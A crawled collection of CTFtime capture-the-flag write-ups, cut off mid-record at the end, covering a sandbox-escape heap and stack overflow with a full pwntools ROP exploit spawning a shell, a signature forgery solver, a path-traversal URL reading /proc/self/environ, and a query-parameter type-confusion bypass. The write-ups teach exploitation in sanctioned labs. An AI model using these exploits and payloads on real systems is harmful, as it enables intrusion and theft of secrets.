{"url": "https://ctftime.org/writeup/40503", "title": "Ipsecs", "content": "# ipsecs\n\n\nThis is a task by @phoen1xxx from the student MCTF 2025  \n\n\n## What is going on?\n\n\nIn this task we have a typical socat-based setup with a Linux x86_64 userspace [program](\nhttps://github.com/s41nt0l3xus/CTF-writeups/blob/master/mctf-student-quals-2025/ipsecs/task/src/main.c\n). With this program we can execute our x86_64 code in a seccomp sandbox with only read, write, and exit syscalls available. Besides the process with our code, we have its parent process with a [pipe-based IPC interface](\nhttps://github.com/s41nt0l3xus/CTF-writeups/blob/master/mctf-student-quals-2025/ipsecs/task/src/ipc\n). With this interface we can send commands that will be processed by the parent process. It is clear that we need to achieve code execution in the container with the program to read the flag using a suitable [catflag](\nhttps://github.com/s41nt0l3xus/CTF-writeups/blob/master/mctf-student-quals-2025/ipsecs/task/src/catflag/catflag.c\n) program (`/catflag`). So it looks like in this task we need to perform an escape from our sandbox using vulnerabilities in the parent's message handling mechanisms.\n\n\n## IPC\nIPC messages here are simple blocks of data sent via a pipe. Let's look at the appropriate structure definitions:\n```c\n#define LOG \"LOG\"\n#define SAVE \"SAVE\"\n#define FS \"FILE\"\n\n\n#define STORE \"STORE\"\n#define LOAD \"LOAD\"\n#define DELETE \"DELETE\"\n\n\nstruct Storage_entry {\n  char* name;\n  size_t length;\n};\n\n\nstruct Storage_cmd {\n  size_t index;\n  char action[8];\n  size_t len;\n  char data[232];\n};\n\n\nstruct Fs_cmd {\n  char action [8];\n  char filename[8];\n  char data[240];\n};\n\n\nunion Data {\n  char data[256]; //data\n  struct Fs_cmd fs;\n  struct Storage_cmd storage;\n};\n\n\ntypedef struct Cmd {\n  char type[8]; //LOG OR SAVE OR FS\n  union Data data;\n} Cmd;\n```\nIt is clear that there are 3 types of messages: `LOG`, `SAVE`, and `FS`. And `SAVE` and `FS` have their own subtypes. Let's look at how messages are processed:\n```c\nvoid dispatch_cmd(int read_fd,int write_fd) {\n  Cmd cmdx;\n  char buffer[256];\n  size_t res;\n  res = read(read_fd,&cmdx, sizeof(cmdx)); //read cmd from read_fd\n  if(res > 0) {\n    if(!strncmp(cmdx.type,LOG,strlen(LOG))) { // Just log to stdin\n      cmdx.data.data[255] = '\\0';\n      puts(\"[Parent] Got LOG command.\");\n      printf(\"[Parent] Data: %s\\n\",cmdx.data.data);\n    }\n    else if (!strncmp(cmdx.type,SAVE,strlen(SAVE))) { // Save to storage\n      puts(\"[Parent] Got SAVE command.\");\n      if(!strncmp(cmdx.data.storage.action,STORE,strlen(STORE))) {\n        save_entry(cmdx.data.storage.index,cmdx.data.storage.data,cmdx.data.storage.len);\n      }\n      else if (!strncmp(cmdx.data.storage.action,LOAD,strlen(LOAD))) {\n        read_entry(cmdx.data.storage.index,buffer,cmdx.data.storage.len);\n        puts(\"[Parent] Readed from storage.\");\n        printf(\"[Parent] Data  %s \\n.\",buffer);\n        write(write_fd,buffer,sizeof(buffer)); //send to child process\n      }\n      else if (!strncmp(cmdx.data.storage.action,DELETE,strlen(DELETE))) {\n        delete_entry(cmdx.data.storage.index);\n      }\n    }\n    else if (!strncmp(cmdx.type,FS,strlen(FS))) { // Save to filesystem\n      puts(\"[Parent] Got FS command.\");\n      if(!strncmp(cmdx.data.fs.action,STORE,strlen(STORE))) {\n        save_file(cmdx.data.fs.filename,cmdx.data.fs.data,sizeof(cmdx.data.fs.data)); //save file to filesystem\n        printf(\"[Parent] File %s sucessfully saved.\\n\",cmdx.data.fs.filename);\n      }\n      else if (!strncmp(cmdx.data.fs.action,LOAD,strlen(LOAD))) {\n        read_file(cmdx.data.fs.filename,buffer,sizeof(buffer)); // read from filesystem\n        printf(\"[Parent] File %s sucessfully read.\\n\",cmdx.data.fs.filename);\n        printf(\"[Parent] File data: %s\\n\",buffer);\n        write(write_fd,buffer,sizeof(buffer)); //send to child process\n      }\n    }\n  }\n}\n```\nSo it looks very simple. Within our sandboxed code we can send commands as the structures defined above and can receive results.\n\n\n## Vulnerabilities\n\n\nLong story short, let's move to the vulnerabilities. \n\n\n## Heap Buffer Overflow\n\n\nOne of the command types - `SAVE` - is basically classic heap CRUD. We can malloc chunks and write our data there (`STORE`), read data from already malloc'ed chunks (`LOAD`), and free chunks (`DELETE`). And of course this CRUD is vulnerable:\n```c\nvoid save_entry(size_t index,char* data,size_t length) {\n  if(index >= 10) {\n    puts(\"[Parent] Error: index to save is too big.\");\n    return;\n  }\n  struct Storage_entry* current = entries[index];\n  if(current != NULL) {\n    puts(\"[Parent] Entry exists.\");\n    return;\n  }\n  if(length > 0x100){\n    puts(\"Length is too big.\");\n    return;\n  }\n\n\n  entries[index] = malloc(sizeof(struct Storage_entry));\n  current = entries[index];\n  current->name = malloc(length);\n  current->length = strlen(data);\n  memcpy(current->name,data,current->length);\n}\n```\nWe can see that the size for allocation is determined by an incoming parameter (actually, we fully control this field in the IPC message), but the data that is written is based on its `strlen`. This means that we can write more bytes into `current->name` than intended — we have a heap buffer overflow. Also, we can notice one important thing here: we can't write any `0x00` bytes in the name because the first `0x00` byte in our data will become the string terminator.\n\n\nProbably with precise heap operation control available (we have CRUD), this heap overflow is enough to fully pwn it, but while solving this task I noticed another interesting vulnerability. And this one, as I figured out after the CTF, was unintended and became the main reason for creating this writeup :)\n\n\n## Stack Buffer Overflow\n\n\n![](\nhttps://github.com/s41nt0l3xus/CTF-writeups/raw/master/mctf-student-quals-2025/ipsecs/assets/unintended.jpg\n)\n\n\nLet's look at handling of `SAVE` `LOAD` message (entry's reading):\n```c\nvoid read_entry(size_t index,char* data,size_t length) {\n  if(index >= 10) {\n    puts(\"[Parent] Error: index to read is too big.\");\n    return;\n  }\n  struct Storage_entry* current = entries[index];\n  if(current == NULL) {\n    puts(\"[Parent] Entry not exists.\");\n    return;\n  }\n  memcpy(data,current->name,current->length); // read_data\n}\n```\nWe can see that the incoming `length` of `data` is ignored, and up to `current->length` is copied to the destination. The destination is a local stack buffer of size `0x100` (in the `dispatch_cmd` function). This means that with `current->length >= 0x100` we can overflow the stack buffer, which is a very powerful primitive. Unfortunately, there is a check for the entry's size in its creation logic. But with a heap corruption primitive like the one we already found (heap buffer overflow), it may be possible to create a large enough `current->length`.\n\n\nBut before we start exploitation we need to solve one practical problem.\n\n\n## Proxy\n\n\nThe main task idea is sandboxed execution with only IPC and read and write syscalls available. This means that we can communicate with the vulnerable process only through our own assembly code running in the forked process with a seccomp filter. So we needed either to accept that the exploit had to be written in assembly or prepare a small proxy that would forward our requests to the target from `stdin`. With such a proxy, we could write the exploit in `Python` with `pwntools` in a familiar way. I used `nasm` to prepare such a simple proxy:\n\n\n```nasm\ninit:\n  ; save pipe descriptors\n  mov r8, rdi\n  mov r9, rsi\n; infinite proxy cycle\nproxy:\n  ; clear buffer\n  mov rdi, rsp\n  call clear\n\n\n  ; read command from stdin\n  mov rdi, 0x00\n  mov rsi, rsp\n  mov rdx, 0x108\n  call read\n\n\n  ; forward command to vulnerable process\n  mov rdi, r9\n  mov rsi, rsp\n  mov rdx, 0x108\n  call write\n\n\n  ; repeat\n  jmp proxy\n\n\nread:\n  push 0x00\n  pop rax\n  syscall\n  ret\n\n\nwrite:\n  push 0x01\n  pop rax\n  syscall\n  ret\n\n\nclear:\n  mov rcx, 0x00\n  loop:\n    mov qword [rdi], 0x00\n    add rdi, 0x08\n    add rcx, 0x08\n    cmp rcx, 0x108\n    jl loop\n  ret\n```\n## Leaks\n\n\nOf course, one of the exploitation steps is defeating ASLR by obtaining address space leaks. And I think we can easily get all required leaks right at the beginning. Since we fully control the code executed in the forked process, we can simply write to `stdout` all addresses from its address space - they will be the same as in the parent process (that’s how `fork` works). So we can leak:\n\n\nThe binary address from the return address (our code is called as a function with a return address somewhere in the binary):\n```nasm\n  ; leak binary's addres from return address\n  mov rdi, 0x01\n  mov rsi, rsp\n  mov rdx, 0x08\n  call write\n```\nThe stack address from the `rsp` register:\n```nasm\n  ; leak stack address from rsp\n  push rsp\n  mov rdi, 0x01\n  mov rsi, rsp\n  mov rdx, 0x08\n  call write\n  pop rax\n```\nAnd the canary from its storage (`fs:0x28`):\n```nasm\n  ; leak canary from its storage\n  mov rax, fs:0x28\n  push rax\n  mov rdi, 0x01\n  mov rsi, rsp\n  mov rdx, 0x08\n  call write\n  pop rax\n```\nThe libc address from the binary’s GOT:\n```nasm\n  ; leak libc from GOT\n  mov rax, qword [rsp]\n  add rax, 0x398d\n  push qword [rax]\n  mov rdi, 0x01\n  mov rsi, rsp\n  mov rdx, 0x08\n  call write\n  pop rax\n```\nComplete code of proxy can be found [here](\nhttps://github.com/s41nt0l3xus/CTF-writeups/blob/master/mctf-student-quals-2025/ipsecs/task/proxy.nasm\n). Now we only need to read this leaks from `pwntools` exploit.\n\n\n## Exploitation\n\n\nFirst, let's build and run our proxy and read all leaks:\n```python\n  os.system('nasm -f bin proxy.nasm')\n  proxy = open('proxy', 'rb').read()\n  assert(not b'\\n' in proxy)\n  io.sendline(proxy)\n \n  stack = u64(io.recv(8)) - 0x518\n  log.debug(f'stack @ {stack:#x}')\n  binary = u64(io.recv(8))\n  log.debug(f'binary @ {binary:#x}')\n  libc.address = u64(io.recv(8)) - 0x8ce80\n  log.debug(f'libc @ {libc.address:#x}')\n  canary = u64(io.recv(8))\n  log.debug(f'canary @ {canary:#x}')\n```\nNow we need python interface for communication via proxy:\n```python\ndef store(idx, l, data):\n  assert(idx < 0x10)\n  assert(len(data) < 0xe8)\n  p  = b''\n  p += b'SAVE'.ljust(8, b'\\x00')\n  p += p64(idx)\n  p += b'STORE'.ljust(8, b'\\x00')\n  p += p64(l)\n  p += data\n  io.send(p)\n  io.recvline()\n\n\ndef load(idx, data=b''):\n  assert(idx < 0x10)\n  p  = b''\n  p += b'SAVE'.ljust(8, b'\\x00')\n  p += p64(idx)\n  p += b'LOAD'.ljust(8, b'\\x00')\n  p += data\n  io.send(p)\n  io.recvline()\n  io.recvline()\n  io.recvuntil(b'Data  ')\n  return io.recvuntil(b' \\n', drop=True)\n\n\ndef delete(idx):\n  assert(idx < 0x10)\n  p  = b''\n  p += b'SAVE'.ljust(8, b'\\x00')\n  p += p64(idx)\n  p += b'DELETE'.ljust(8, b'\\x00')\n  io.send(p)\n  io.recvline()\n ```\nAlso let's prepare primitives for interacting directly with `malloc`:\n```python\ndef malloc(idx, chunksz, data=b'\\x00'):\n  assert(chunksz & 0x0F == 0x00)\n  assert(chunksz >= 0x20)\n  assert(chunksz <= 0xe0)\n  store(idx, chunksz-0x08, data)\n\n\ndef free(idx):\n  delete(idx)\n```\nNow is time to think about the exploitation strategy. With all leaks and the stack buffer overflow, it's straightforward. We will use stack buffer overflow to execute arbitrary code via ROP-chain. With our heap corruption (the buffer overflow in entry creation), we need to prepare an entry with a large enough `current->length` and with `current->name` pointing to a buffer containing a ROP-chain.\n \nBut we can’t simply place our ROP-chain in the original `current->name` buffer because we can’t place a `0x00` byte there. Before the entry’s heap buffer, our command is stored in a local stack buffer of the dispatch function. The command data there could contain arbitrary bytes, so we can use that buffer as the source of the ROP-chain by writing its address in place of `current->name`.\n \nHow could we overwrite `current->name`? We don’t even need advanced heap corruption techniques. We can simply use our heap buffer overflow to overwrite the low six bytes of `current->name`. Only six bytes, because we need to keep zeros in the two high bytes - we can’t write zero bytes with our buffer overflow.\n \nAnd how can we overwrite `current->length`? Here we face a problem: we can’t overwrite it using the heap overflow without fully overwriting `current->name`, because `current->name` is located before `current->length` in memory. But we can't do that - we need to keep zeros in the two high bytes of the `current->name` address. So we need another way.\n \nIt takes too long to fully explain how (I call it heap-hop), but with heap corruption caused by the buffer overflow, we can force `malloc` to write the size of a chunk in place of `current->length`. This is possible because `malloc` chunk sizes and `current->length` are both located at addresses of the form `0x10 * N + 0x08`\n\n\nSo... Putting in all together we'll come up with this sequence of `malloc`/`free` calls and heap buffer overflows:\n```python\n  # Just heap-hop\n  malloc(0x00, 0x30)\n  malloc(0x01, 0x30)\n  free(0x00)\n  malloc(0x02, 0x20)\n  malloc(0x03, 0x20)\n  malloc(0x04, 0xe0)\n  malloc(0x05, 0xe0)\n  malloc(0x06, 0xe0)\n  malloc(0x07, 0xe0)\n  # First heap buffer overflow\n  # Need to increase size of next chunk and force malloc to realloc memory right after original chunk\n  # With such corruption we'll force malloc to write chunk size in place of `current->length`\n  malloc(0x00, 0x30, b'X'*0x28+p16(0x4b1))\n  free(0x00)\n  free(0x01)\n  free(0x02)\n  malloc(0x00, 0x80)\n  malloc(0x08, 0x30)\n  # Second heap buffer overflow\n  # Need to overwrite `current->name`\n  malloc(0x01, 0x30, b'X'*0xa0+p64(stack - 0x110 + 0x18 - 0x108))\n``` \nNow, after obtaining the appropriate stack buffer address in `current->name` and a large enough size (actually the chunk size) in `current->length`, we can trigger entry reading with our ROP-chain stored inside the `SAVE` `LOAD` command’s data. The vulnerable entry reading would trigger a stack buffer overflow, leading to execution of the ROP chain and arbitrary code execution:\n```python\n  # Prepare ROP-chain\n  rop = ROP(libc)\n  rop.raw(rop.ret.address)\n  rop.call(libc.symbols['system'], (next(libc.search(b'/bin/sh\\x00')),))\n\n\n  # Overflow payload\n  p  = b''\n  p += p64(canary) # restore canary\n  p += b'X'*0x08   # don't care about saved rbp\n  p += rop.chain() # ROP-chain\n\n\n  # Load corrupted entry to trigger stack buffer overflow\n  load(0x03, data=p)\n\n\n  io.interactive()\n```\nComplete code of exploit can be found [here](\nhttps://github.com/s41nt0l3xus/CTF-writeups/blob/master/mctf-student-quals-2025/ipsecs/task/xpl01t.py\n).\n\n\n## Intended\n\n\nAfter the CTF was over I figured out that my way to solve it wasn’t intended. Of course, it was pwnable using only the heap buffer overflow since it is a very powerful primitive. It was possible to simply poison tcache, malloc into the GOT, and overwrite it to hijack control flow. But I think that despite the higher complexity, this solution is more interesting.\n\n\n![](\nhttps://github.com/s41nt0l3xus/CTF-writeups/raw/master/mctf-student-quals-2025/ipsecs/assets/all_vulns.jpg\n)", "source": "ctftime", "crawled_at": "2025-11-27T17:34:30.305212"}
{"url": "https://ctftime.org/writeup/40497", "title": "nitwit", "content": "---\n\n\n## Solver\n\n\n```python\n#!/usr/bin/env python3\nimport socket, ssl, hashlib, ast, re, sys, time\n\n\nHOST = \"\nnitwit.challs.pwnoh.io\n\"\nPORT = 1337\nCONNECT_TIMEOUT = 15\nREAD_TIMEOUT = 2.5\nPOST_SEND_READ_LOOPS = 40\n\n\ndef h(x: bytes) -> bytes:\n    return hashlib.sha256(x).digest()\n\n\ndef chain(x: bytes, t: int) -> bytes:\n    for _ in range(t):\n        x = h(x)\n    return x\n\n\ndef int_to_vec_buggy(m: int, vec_len: int, base: int = 16):\n    digits = [0] * vec_len\n    i = vec_len - 1\n    while m > 0:\n        digits[i] = m % base\n        m //= base\n        i -= 1\n    return digits\n\n\ndef df_vec(msg_bytes: bytes):\n    d = 15\n    n0 = 64\n    n1 = 2\n    m_int = int.from_bytes(msg_bytes, \"big\")\n    m_vec = int_to_vec_buggy(m_int, n0, 16)\n    c = d * n0 - sum(m_vec)\n    c_vec = int_to_vec_buggy(c, n1, 16)\n    return m_vec + c_vec\n\n\nTOKEN_RE = re.compile(rb\"\"\"b(['\"])(?:\\\\.|(?!\\1).)*\\1\"\"\", re.S)\n\n\ndef extract_sig_list(buf: bytes, expect: int = 66):\n    sig = []\n    for m in TOKEN_RE.finditer(buf):\n        lit = m.group(0).decode(\"ascii\", \"strict\")\n        try:\n            sig.append(ast.literal_eval(lit))\n        except Exception:\n            continue\n        if len(sig) == expect:\n            return sig\n    return None\n\n\nFLAG_RE = re.compile(rb'(?i)(flag\\{[^}]+\\}|pwnoh\\{[^}]+\\}|pwn\\{[^}]+\\})')\n\n\ndef main():\n    m0 = b\"\\x00\" * 32\n    m_new = b\"admin\" + b\"\\xff\" * 23 + b\"\\x40\" + b\"\\x00\" * 3\n    assert len(m_new) == 32\n\n\n    s_old = df_vec(m0)\n    s_new = df_vec(m_new)\n    for i, (a, b) in enumerate(zip(s_old, s_new)):\n        if b < a:\n            raise RuntimeError(f\"delta negative at idx {i}: {b} < {a}\")\n\n\n    ctx = ssl.create_default_context()\n    with socket.create_connection((HOST, PORT), timeout=CONNECT_TIMEOUT) as raw:\n        with ctx.wrap_socket(raw, server_hostname=HOST) as s:\n            s.settimeout(CONNECT_TIMEOUT)\n\n\n            buf = b\"\"\n            while b\">>> \" not in buf:\n                chunk = s.recv(8192)\n                if not chunk:\n                    break\n                buf += chunk\n                sys.stdout.write(chunk.decode(errors=\"ignore\"))\n                sys.stdout.flush()\n\n\n            s.sendall((m0.hex() + \"\\n\").encode())\n\n\n            data = b\"\"\n            sig = None\n            while True:\n                chunk = s.recv(8192)\n                if not chunk:\n                    break\n                data += chunk\n                sys.stdout.write(chunk.decode(errors=\"ignore\"))\n                sys.stdout.flush()\n                if sig is None:\n                    sig = extract_sig_list(data, expect=66)\n                if sig is not None and (b\">>> \" in data):\n                    break\n\n\n            if sig is None or len(sig) != 66:\n                raise RuntimeError(f\"[x] Failed to parse signature list (got {0 if sig is None else len(sig)})\")\n\n\n            s.sendall((m_new.hex() + \"\\n\").encode())\n\n\n            data2 = b\"\"\n            while b\">>> \" not in data2:\n                chunk = s.recv(8192)\n                if not chunk:\n                    break\n                data2 += chunk\n                sys.stdout.write(chunk.decode(errors=\"ignore\"))\n                sys.stdout.flush()\n\n\n            forged = [chain(sig[i], s_new[i] - s_old[i]) for i in range(len(s_new))]\n            payload = repr(forged) + \"\\n\"\n            s.sendall(payload.encode())\n\n\n            s.settimeout(READ_TIMEOUT)\n            full = b\"\"\n            got_flag = None\n            for _ in range(POST_SEND_READ_LOOPS):\n                try:\n                    chunk = s.recv(8192)\n                    if not chunk:\n                        break\n                    full += chunk\n                    sys.stdout.write(chunk.decode(errors=\"ignore\"))\n                    sys.stdout.flush()\n                    m = FLAG_RE.search(full)\n                    if m:\n                        got_flag = m.group(1).decode(errors=\"ignore\")\n                        break\n                except socket.timeout:\n                    continue\n\n\n            if got_flag:\n                print(\"\\n[+] FLAG:\", got_flag)\n            else:\n                time.sleep(0.2)\n                try:\n                    while True:\n                        chunk = s.recv(8192)\n                        if not chunk:\n                            break\n                        full += chunk\n                        sys.stdout.write(chunk.decode(errors=\"ignore\"))\n                        sys.stdout.flush()\n                        m = FLAG_RE.search(full)\n                        if m:\n                            print(\"\\n[+] FLAG:\", m.group(1).decode(errors=\"ignore\"))\n                            break\n                except Exception:\n                    pass\n\n\nif __name__ == \"__main__\":\n    main()\n\n\n```\n\n\n## Output:\n```text\nFLAG: bctf{i_f0rg0t_h0w_t0_r3ad_m4th_n0t4t10n}\n```", "source": "ctftime", "crawled_at": "2025-11-27T17:34:51.209647"}
{"url": "https://ctftime.org/writeup/40491", "title": "SYNDRÖM DECÖD", "content": "# \nHack.lu\n CTF 2025 SYNDRÖM DECÖD Writeup (Crypto)\n\n\nwriteup: **fridgebuyer**\n\n\nCategory: **Crypto**\n\n\n## Challenge Overview\nA McEliece cryptosystem challenge where the goal is to solve a syndrome decoding problem.\nThe service provides a syndrome and asks for an error vector of weight 4 that produces it.\n\n\n## Vulnerability Analysis\n\n\n### The Bug (\nmain.py:108\n)\nIn the `ask_solution()` function, there is a critical logic error:\n\n\n```python\n# Line 107: User's input is converted to a vector\ndata = vector(GF(2), data)\n\n\n# Line 108: BUG - uses 'e' instead of 'data'\ncheck_syndrome = encode(e, T, P)\n```\n\n\nThis should be:\n```python\ncheck_syndrome = encode(data, T, P)\n```\n\n\n### Impact\nThe syndrome verification always recomputes the syndrome from the original error `e`\n(randomly generated at startup) rather than from the user's submitted `data`.\n\n\nThis means:\n- `syndrome` (line 75) = encode(e, T, P)\n- `check_syndrome` (line 108) = encode(e, T, P)  [SAME!]\n\n\nThe comparison on lines 114-117 will ALWAYS pass because both values are identical.\n\n\n## Exploitation\n\n\n### Strategy\nSubmit ANY binary vector of length 3488 with exactly weight 4.\nThe validation only checks:\n1. Length is 3488\n2. All bits are binary (0 or 1)\n3. Hamming weight is 4\n\n\nIt never actually validates that the submitted vector produces the correct syndrome!\n\n\n### Exploit Code\n```python\n# Create a binary vector of length 3488 with exactly 4 ones\nERROR_LENGTH = 3488\nOMEGA = 4\n\n\nerror_vector = ['0'] * ERROR_LENGTH\nfor i in range(OMEGA):\n    error_vector[i] = '1'\n\n\nsolution = ''.join(error_vector)\nprint(solution)\n```\n\n\n### Execution\n```bash\npython3 \nexploit.py\n | openssl s_client -connect \n4477016b56f0220d.syndroem.zone.re:443\n -quiet 2>/dev/null\n```\n\n\n## Root Cause\nVariable name confusion - using `e` (the secret error) instead of `data` (user input)\nin the syndrome computation, completely bypassing the cryptographic challenge.\n\n\n## Flag\nflag{g0t_th3_ikEA_syNdroeM?_qLRII2UFkNsFg7lRNQ}", "source": "ctftime", "crawled_at": "2025-11-27T17:35:09.935362"}
{"url": "https://ctftime.org/writeup/40487", "title": "1985", "content": "![Title](\nhttps://github.com/NEMO246/WRITEUP_CTF/raw/main/BuckeyeCTF%202025/forensics/1985/images/Title.png\n)\n\n\n### Step 1: Analyzing the Source Email and Identifying the Encoding\n\n\nThe challenge began with a text block presented as an old email from 1985.\n\n\n```text\nHey man, I wrote you that flag printer you asked for:\n\n\nbegin 755 \nFLGPRNTR.COM\nMOAP!@#PD=`:`-\"I&Z_6Z'`&T\"<TAP[1,,,#-(4A)7DQ1;AM.=5,:7W5_61EU\n;:T1U&4=?1AY>&EAU95AU3AE)&D=:&T9O6%<D\n`\nend\n```\n\n\n**Artifact Analysis:**\nThe key elements for identification are the `begin 755 \nFLGPRNTR.COM\n` and `end` directives. This structure is a classic indicator of **uudecode** (Unix-to-Unix decoding) encoding. This is a legacy method for converting binary files into ASCII text strings for safe transmission through systems that originally only supported text (like early email).\n\n\n*   `begin` - Marks the start of the encoded file.\n*   `755` - Represents the file's permissions in Unix format.\n*   `\nFLGPRNTR.COM\n` - The name of the file to be created upon decoding.\n\n\n### Step 2: Decoding the Payload\n\n\nAfter identifying the format, the next step was to decode the data to retrieve the original `\nFLGPRNTR.COM\n` file. Since standard libraries for `uudecode` can be missing or deprecated in modern Python versions, a custom decoder was written to reliably handle the data.\n\n\nThe following Python [script](\nhttps://github.com/NEMO246/WRITEUP_CTF/blob/main/BuckeyeCTF%202025/forensics/1985/decode.py\n) implements the `uudecode` logic manually. It reads the encoded lines, skipping the header and footer, and converts each line from its text representation back into binary bytes.\n\n\n```python\n# This program implements a manual decoder for the uuencode format.\n\n\nlines = []\nrecording = False\n# The encoded data from the email\ndata = \"\"\"begin 755 \nFLGPRNTR.COM\nMOAP!@#PD=`:`-\"I&Z_6Z'`&T\"<TAP[1,,,#-(4A)7DQ1;AM.=5,:7W5_61EU\n;:T1U&4=?1AY>&EAU95AU3AE)&D=:&T9O6%<D\n`\nend\n\"\"\"\n\n\n# Parse the input data to extract only the encoded lines\nfor line in data.splitlines():\n    if line.startswith(\"begin \"):\n        recording = True\n        continue\n    if line.startswith(\"end\"):\n        break\n    if recording:\n        lines.append(line.strip())\n\n\n# Function to decode a single uu line\ndef uudecode_line(line):\n    if not line:\n        return b''\n    # The first character determines the length of the decoded bytes in the line\n    length = (ord(line[0]) - 32) & 0x3F\n    line = line[1:]\n    out = bytearray()\n    while line:\n        chunk, line = line[:4], line[4:]\n        # Convert 4 ASCII characters into 3 bytes\n        nums = [(ord(c) - 32) & 0x3F for c in chunk]\n        a, b, c, d = nums + [0] * (4 - len(nums))\n        out.extend([\n            (a << 2 | b >> 4) & 0xFF,\n            (b << 4 | c >> 2) & 0xFF,\n            (c << 6 | d) & 0xFF\n        ])\n    return bytes(out[:length])\n\n\n# Decode all lines and join them\ndecoded = b''.join(uudecode_line(l) for l in lines if l and not l.startswith('`'))\n\n\n# Write the result to a binary file\nwith open(\"\nFLGPRNTR.COM\n\", \"wb\") as f:\n    f.write(decoded)\n\n\n```\nExecuting this script successfully created the binary file `\nFLGPRNTR.COM\n`.\n\n\n### Step 3: Analyzing and Executing the Binary\n\n\nThe resulting file, `\nFLGPRNTR.COM\n`, is a 16-bit executable program for MS-DOS. Such programs cannot be run directly on modern 64-bit operating systems.\n\n\n**Analysis and Emulation:**\nAn MS-DOS emulator was required to run the file. **DOSBox** is the standard tool for such tasks. The process for running the program in DOSBox was as follows:\n\n\n1.  Launch DOSBox.\n2.  Mount the current directory as the `C:` drive using the command:\n    `mount c .`\n3.  Switch to the mounted `C:` drive:\n    `c:`\n4.  Run the program by typing its name:\n    `\nFLGPRNTR.COM\n`\n\n\n![DOSBox Execution](\nhttps://github.com/NEMO246/WRITEUP_CTF/raw/main/BuckeyeCTF%202025/forensics/1985/images/1.png\n)\n\n\nAfter executing these commands, the program ran and printed the flag directly to the emulator's console.\n\n\n### FLAG\n\n\n**`bctf{D1d_y0u_Us3_An_3mul4t0r_Or_d3c0mp1lEr}`**", "source": "ctftime", "crawled_at": "2025-11-27T17:35:17.804349"}
{"url": "https://ctftime.org/writeup/40484", "title": "Awklet", "content": "![Title](\nhttps://github.com/NEMO246/WRITEUP_CTF/raw/main/BuckeyeCTF%202025/web/Awklet/images/Title.png\n)\n\n\n### Step 1: Initial Analysis and Problem Description\n\n\nThe challenge provides a web application called **Awklet**, which generates ASCII art from user-input text using various fonts. The service is built on Apache with CGI enabled, running an AWK script (`awklet.awk`) to process requests. Users can select a font (standard, block, slant, shadow) and input text via a form, which sends GET parameters to the CGI script.\n\n\nThe source code, provided in a Dockerfile and related files, reveals that the script parses the query string, loads a font file based on the `font` parameter, and renders the ASCII art. Notably, the font loading function concatenates the font name with \".txt\" and reads it without any validation or sanitization, hinting at a path traversal vulnerability.\n\n\nThe environment also passes a `FLAG` variable to Apache, accessible via `/proc/self/environ` in the process context.\n\n\n**Objective:** Exploit the path traversal to read arbitrary files, specifically the process environment to retrieve the flag.\n\n\n### Step 2: Exploitation Strategy and Exploit Creation\n\n\nThe vulnerability lies in the `load_font` function, which opens `font_name \".txt\"` using `getline`. By supplying a `font` parameter with directory traversal (e.g., `../../../../some/file`), we can read files outside the intended directory. To bypass the \".txt\" suffix, we use a null byte (`%00`) in the URL, which terminates the filename string in AWK, allowing us to target files like `/proc/self/environ` without the extension.\n\n\nThe exploit involves crafting a GET request to read `/proc/self/environ`, which contains the `FLAG` environment variable. No preliminary testing is needed; we proceed directly to the final payload.\n\n\n### Step 3: Step-by-Step Execution\n\n\n#### 1. Direct Exploitation with Final Payload\n\n\nCraft the URL to traverse directories and read `/proc/self/environ` directly, using the null byte to handle the file extension.\n\n\nURL: `\nhttps://awklet.challs.pwnoh.io/cgi-bin/awklet.awk?name=x&font=../../../../proc/self/environ%00\n`\n\n\nThe response displays the contents of `/proc/self/environ` as \"ASCII art\" lines, including the `FLAG` environment variable.\n\n\n![environ](\nhttps://github.com/NEMO246/WRITEUP_CTF/raw/main/BuckeyeCTF%202025/web/Awklet/images/1.png\n)\n\n\n### Flag\n\n\n`bctf{n3xt_t1m3_1m_wr171ng_1t_1n_53d}`", "source": "ctftime", "crawled_at": "2025-11-27T17:35:25.698009"}
{"url": "https://ctftime.org/writeup/40483", "title": "BIG CHUNGUS", "content": "![Title](\nhttps://github.com/NEMO246/WRITEUP_CTF/raw/main/BuckeyeCTF%202025/web/BIG%20CHUNGUS/images/Title.png\n)\n\n\n### Step 1: Initial Analysis and Source Code Review\n\n\nThe challenge provides a web application and a zip archive containing its source code. The main page features a simple form asking for a `username`.\n\n\nAnalyzing the `index.js` file from the archive is the key to understanding the logic. The code is written in Node.js using the Express framework. The core logic is found within the GET request handler:\n\n\n1.  If the `username` parameter is missing, a \"NO CHUNGUS\" page is displayed.\n2.  If a `username` is provided, its length is compared to the hexadecimal number `0xB16_C4A6A5`.\n3.  If the length is **greater than** this number, the server displays the \"BIG CHUNGUS\" page, which contains the flag.\n4.  Otherwise, a sad \"little chungus\" page is shown.\n\n\nThe critical piece of code containing the condition to get the flag is:\n```javascript\nif (req.query.username.length > 0xB16_C4A6A5) {\n    res.send(`\n    ...\n    FLAG: ${process.env.FLAG || \"FLAG_NOT_SET\"}\n    ...\n    `);\n    return;\n}\n```\nFirst, we must convert `0xB16_C4A6A5` to its decimal value to understand the required length. This number is equal to `47,612,473,445`. It's obviously impossible to send a URL parameter of this length due to technical limitations. This indicates that we need to find a bypass related to how Express.js parses query parameters.\n\n\n### Step 2: Vulnerability Discovery and Payload Crafting\n\n\nThe problem is to make the expression `req.query.username.length` return a massive number without actually sending billions of characters.\n\n\nThe vulnerability lies in how the `qs` library (the default query parser in Express) handles nested parameters. If you send a parameter in the format `?name[property]=value`, the server will create an object `\nreq.query.name\n` with a property named `property`.\n\n\nThis allows us to directly manipulate the `username` object on the server. Instead of trying to force the server to calculate the length of a massive array (which is often blocked for security reasons), we can simply **give the `username` object a `length` property** with the value we want.\n\n\nThanks to JavaScript's loose (dynamic) typing, when the comparison `req.query.username.length > 47612473445` is made, the string we provide will be automatically converted into a number.\n\n\nTherefore, we can craft a payload that sets `username.length` to a value that is guaranteed to be larger than `47,612,473,445`.\n\n\n**Payload:**\n```\nhttps://big-chungus.challs.pwnoh.io/?username\n[length]=99999999999\n```\n\n\n### Step 3: Exploitation and Retrieving the Flag\n\n\nBy sending the crafted URL, we trigger the following chain of events on the server:\n\n\n1.  The server receives the request, and the `qs` parser transforms `?username[length]=99999999999` into a `req.query` object that looks like this: `{ username: { length: '99999999999' } }`.\n2.  The code proceeds to the check: `if (req.query.username.length > 0xB16_C4A6A5)`.\n3.  The expression `req.query.username.length` returns the value `'99999999999'`.\n4.  JavaScript compares the number `99999999999` with the number `47612473445`.\n5.  The condition evaluates to `true`, and the server returns the \"BIG CHUNGUS!!!\" HTML page, which contains the 